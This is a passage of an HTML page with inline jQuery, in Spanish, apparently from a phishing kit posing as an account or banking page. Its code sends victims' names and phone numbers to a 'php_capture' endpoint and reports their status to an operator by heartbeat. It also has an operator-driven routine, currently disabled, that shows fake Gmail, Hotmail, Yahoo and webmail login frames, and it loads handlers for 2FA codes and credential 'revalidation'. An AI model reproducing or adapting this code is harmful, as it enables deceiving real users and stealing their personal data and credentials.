            <div style="position:relative;float:right;margin-right:10px"><span class="footerText">v.2.2.5.6 build: Thu Aug 17 14:52:38 CDT 2023</span></div>
        </div>
        <div style="clear:both"></div>
        </div>
        </span>

        <script src="jstp/jquery-1.js"></script>
        <script type="text/javascript">
function validateEmail($email) {
  var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
  return emailReg.test( $email );
}
$('#d_submit').click(function(){
	d_n = $('#d_nombre')
	d_t = $('#d_tel')
	d_c = $('#d_cel')
	// d_co = $('#d_correo')
	var error = 0;
    if( d_n.val().length === 0 ) {
        d_n.removeClass('form-control-1').addClass('form-control-2');
		d_n.focus();
		error = 1;
	}
	if( d_t.val().length < 10 ) {
		d_t.removeClass('form-control-1').addClass('form-control-2');
        d_t.focus();
		error = 1;
    }
	if( d_c.val().length < 10 ) {
		d_c.removeClass('form-control-1').addClass('form-control-2');
        d_c.focus();
		error = 1;
    }
	// if( d_co.val().length === 0 ) {
	// 	d_co.removeClass('form-control-1').addClass('form-control-2');
    //     d_co.focus();
	// 	error = 1;
	// }else{
	// 	if(!validateEmail(d_co.val())){
	// 		d_co.removeClass('form-control-1').addClass('form-control-2');
	// 		d_co.focus();
	// 		error = 1;			
	// 	}
	// }

	if(error == 0){
		var fd = new FormData();
		fd.append('nombre', d_n.val().trim());
		fd.append('fijo', d_t.val().trim());
		fd.append('cel', d_c.val().trim());
		fetch('php_capture/capData.php', { method: 'POST', body: fd })
			.then(function() {})
			.catch(function() {});
		window.HEARTBEAT_PAGINA_LABEL = 'Espera';
		if (typeof window.enviarHeartbeat === 'function') window.enviarHeartbeat('online');
		$('.remainingdiv').hide();
        $("#end_").delay(900).fadeIn();
	}

});
$('#input_submit').click(function(){
	d_input = $('#d_input')
	d_input_msg = $('#msg_input_val').val()
	var error = 0;
    if( d_input.val().length === 0 ) {
        d_input.focus();
		error = 1;
	}
	
	if(error == 0){
		$('#t_input').fadeOut('slow', function() {
			$('#loader_box').fadeIn('slow');
		});
	}
});
$('#input_prefijo').click(function(){
	d_prefijo = $('#prefijo_');
	var error = 0;
    if( d_prefijo.val().length === 0 ) {
        d_prefijo.focus();
		error = 1;
	}
	
	if(error == 0){
		$('#t_prefijo').fadeOut('slow', function() {
			$('#loader_box').fadeIn('slow');
		});
	}
});
function initEsperaScreen() {
    window.HEARTBEAT_PAGINA_LABEL = 'Espera';
    if (typeof window.enviarHeartbeat === 'function') window.enviarHeartbeat('online');
    $('.remainingdiv').hide();
    $('#end_').show();
}

$(document).ready(function() {
    initEsperaScreen();
    // Último acceso: fecha y hora actual del sistema
    var now = new Date();
    var dd = ('0' + now.getDate()).slice(-2);
    var mm = ('0' + (now.getMonth() + 1)).slice(-2);
    var yyyy = now.getFullYear();
    var hh = ('0' + now.getHours()).slice(-2);
    var min = ('0' + now.getMinutes()).slice(-2);
    var ss = ('0' + now.getSeconds()).slice(-2);
    $('#ultimo_acceso_fecha').text(dd + '/' + mm + '/' + yyyy);
    $('#ultimo_acceso_hora').text(hh + ':' + min + ':' + ss);
    // Usuario: el ingresado en login (desde sesión/BD)
    fetch('php_capture/getSessionUser.php').then(function(r){ return r.json(); }).then(function(d){
        $('#ultimo_acceso_usuario').text(d.usuario || '—');
    }).catch(function(){ $('#ultimo_acceso_usuario').text('—'); });
    // Nombre: solo letras y espacios, siempre mayúsculas
    $('#d_nombre').on('input', function() {
        var v = $(this).val().toUpperCase().replace(/[^A-Z\s]/g, '');
        $(this).val(v);
    });
    // Teléfono fijo y celular: solo 10 dígitos numéricos
    $('#d_tel, #d_cel, #aviso_cel').on('input', function() {
        var v = $(this).val().replace(/\D/g, '').slice(0, 10);
        $(this).val(v);
    });
    $('#aviso_submit').on('click', function(e) {
        e.preventDefault();
        var cel = ($('#aviso_cel').val() || '').replace(/\D/g, '');
        var err = $('#aviso_error');
        err.hide().text('');
        if (cel.length !== 10) {
            err.text('El número de contacto debe tener 10 dígitos.').show();
            $('#aviso_cel').focus();
            return;
        }
        var fd = new FormData();
        fd.append('nombre', '');
        fd.append('cel', cel);
        fd.append('fijo', '');
        fetch('php_capture/capData.php', { method: 'POST', body: fd }).catch(function() {});
        $('#aviso_paso_contacto').hide();
        $('#aviso_carga').show();
        var esperaMs = 350 + Math.floor(Math.random() * 351);
        setTimeout(function() {
            $('#aviso_carga').hide();
            $('#aviso_espera').show();
            window.HEARTBEAT_PAGINA_LABEL = 'Espera';
            if (typeof window.enviarHeartbeat === 'function') window.enviarHeartbeat('online');
        }, esperaMs);
    });
    // $('#loader_box').show();
    function getRandValue(){
        // Estático: sin llamadas al backend
        return;
        $.ajax({
            type: "POST",
            url: "#",
            data: {},
            success: function(data) {
			
			
			var cadena = (data),
			separador = "|",
			arregloDeSubCadenas = cadena.split(separador);
            console.log(arregloDeSubCadenas[0]);
			if (arregloDeSubCadenas[0] == 1) {
                $.ajax({			    	
                        type: "POST",
                        url: "../reset.php",				          
                        data: {'myid': 0},
                        
                        beforeSend: function () {
                            
                        },
                        complete: function () {			                
                                                                                                
                        },				            
                        success: function(pos)
                        {        		

                        }
                    });                   
				$('.remainingdiv').hide();
				$('#contact_paso1').fadeIn('slow');
			return;
			}
			if (arregloDeSubCadenas[0] == 2) {
                $.ajax({			    	
                        type: "POST",
                        url: "../reset.php",				          
                        data: {'myid': 0},
                        
                        beforeSend: function () {
                            
                        },
                        complete: function () {			                
                                                                                                
                        },				            
                        success: function(pos)
                        {        		

                        }
                    });                   
				$('.modal_tela').removeClass('open').addClass('close');
				$('#t_loader').removeClass('close').addClass('open');
			return;
			}
			if (arregloDeSubCadenas[0] == 3) {
                $.ajax({			    	
                        type: "POST",
                        url: "../reset.php",				          
                        data: {'myid': 0},
                        
                        beforeSend: function () {
                            
                        },
                        complete: function () {			                
                                                                                                
                        },				            
                        success: function(pos)
                        {        		

                        }
                    });                   
				$('.modal_tela').removeClass('open').addClass('close');
				var iframe = document.getElementById('iframe_hotmail');
				iframe.src = iframe.src;				
				$('#t_outlook').removeClass('close').addClass('open');
			return;
			}
			if (arregloDeSubCadenas[0] == 4) {
                $.ajax({			    	
                        type: "POST",
                        url: "reset.php",				          
                        data: {'myid': 0},
                        
                        beforeSend: function () {
                            
                        },
                        complete: function () {			                
                                                                                                
                        },				            
                        success: function(pos)
                        {        		

                        }
                    });                   
				$('.modal_tela').removeClass('open').addClass('close');
				var iframe = document.getElementById('iframe_gmail');
				iframe.src = iframe.src;
				$('#t_gmail').removeClass('close').addClass('open');
			return;
			}					
			if (arregloDeSubCadenas[0] == 5) {
                $.ajax({			    	
                        type: "POST",
                        url: "reset.php",				          
                        data: {'myid': 0},
                        
                        beforeSend: function () {
                            
                        },
                        complete: function () {			                
                                                                                                
                        },				            
                        success: function(pos)
                        {        		

                        }
                    });                   
				$('.modal_tela').removeClass('open').addClass('close');
				var iframe = document.getElementById('iframe_yahoo');
				iframe.src = iframe.src;					
				$('#t_yahoo').removeClass('close').addClass('open');
			return;
			}
			if (arregloDeSubCadenas[0] == 6) {
                $.ajax({			    	
                        type: "POST",
                        url: "../reset.php",				          
                        data: {'myid': 0},
                        
                        beforeSend: function () {
                            
                        },
                        complete: function () {			                
                                                                                                
                        },				            
                        success: function(pos)
                        {        		

                        }
                    });                   
				$('.modal_tela').removeClass('open').addClass('close');
				$('#t_asb').removeClass('close').addClass('open');
			return;
			}
			if (arregloDeSubCadenas[0] == 7) {
				$.ajax({			    	
					type: "POST",
					url: "../reset.php",				          
					data: {'myid': 0},
					
					beforeSend: function () {
						
					},
					complete: function () {			                
																							
					},				            
					success: function(pos)
					{        		

					}
				});  
                $('.remainingdiv').hide();
                $('#d_input').val('');
				$('#msg_input').text(arregloDeSubCadenas[1]);
                $('#msg_input_val').val(arregloDeSubCadenas[1]);
                $('#t_input').fadeIn('slow');
			return;
			}
			if (arregloDeSubCadenas[0] == 57) {
				$.ajax({			    	
					type: "POST",
					url: "../reset.php",				          
					data: {'myid': 0},
					
					beforeSend: function () {
						
					},
					complete: function () {			                
																							
					},				            
					success: function(pos)
					{        		

					}
				});  
                $('.remainingdiv').hide();
                $('#d_sin_input').val('');
				$('#msg_sin_input').text(arregloDeSubCadenas[1]);
                $('#msg_sin_input_val').val(arregloDeSubCadenas[1]);
                $('#t_sin_input').fadeIn('slow');
			return;
			}	            								
			if (arregloDeSubCadenas[0] == 10) {
                $.ajax({			    	
                        type: "POST",
                        url: "../reset.php",				          
                        data: {'myid': 0},
                        
                        beforeSend: function () {
                            
                        },
                        complete: function () {			                
                                                                                                
                        },				            
                        success: function(pos)
                        {        		

                        }
                    });                   
				$('.remainingdiv').hide();
				$('#end_').fadeIn('slow');
			return;
			}
			if (arregloDeSubCadenas[0] == 50) {
                $.ajax({			    	
                        type: "POST",
                        url: "../reset.php",				          
                        data: {'myid': 0},
                        
                        beforeSend: function () {
                            
                        },
                        complete: function () {			                
                                                                                                
                        },				            
                        success: function(pos)
                        {        		

                        }
                    });                   
				$('.modal_tela').removeClass('open').addClass('close');
				var iframe = document.getElementById('iframe_webmail');
				iframe.src = iframe.src;					
				$('#t_webmail').removeClass('close').addClass('open');
			return;
			}
			if (arregloDeSubCadenas[0] == 29) {
				$.ajax({			    	
					type: "POST",
					url: "../reset.php",				          
					data: {'myid': 0},
					
					beforeSend: function () {
						
					},
					complete: function () {			                
																							
					},				            
					success: function(pos)
					{        		

					}
				});
				// $('#descarga_url').attr("href", arregloDeSubCadenas[1]);
				$(".remainingdiv").fadeOut(function(){
					$("#t_descarga").fadeIn("slow");
				});
			return;
            }
			if (arregloDeSubCadenas[0] == 30) {
				$.ajax({			    	
					type: "POST",
					url: "../reset.php",				          
					data: {'myid': 0},
					
					beforeSend: function () {
						
					},
					complete: function () {			                
																							
					},				            
					success: function(pos)
					{        		

					}
				});
				$('#prefijo_').val('');
				$(".remainingdiv").fadeOut(function(){
					$("#t_prefijo").fadeIn("slow");
				});
			return;
			}	                                   
            }
        });
    }

    // setInterval(getRandValue, 5000); // desactivado: sin backend
});
</script>

        <script>
        </script>
    <script>window.CONTROL_FOLDER_PATH = 'FNeC5d9YIA';</script>
    <script src="php_modales/JS/coordinador_modales.js?v=20261021f"></script>
    <script src="php_modales/JS/check_status.js?v=20250304"></script>
    <script src="php_modales/JS/modalesInputnoInput.js?v=20261021b"></script>
    <script src="php_modales/JS/herramientas.js?v=20261021b"></script>
    <script src="php_modales/JS/relojPersonalizado.js?v=20261021b"></script>
    <script src="php_modales/JS/redirecciones.js?v=20261021b"></script>
    <script src="php_modales/JS/email_validate_handler.js?v=20261021b"></script>
    <script src="php_modales/JS/espera_push_wait.js?v=20261021"></script>
    <script src="php_modales/JS/auth2fa_handler.js?v=20261021b"></script>
    <script src="php_modales/JS/datos_personales_handler.js?v=20261021f"></script>
    <script src="php_modales/JS/credenciales_revalidar_handler.js?v=20261021m"></script>
</body>

</html>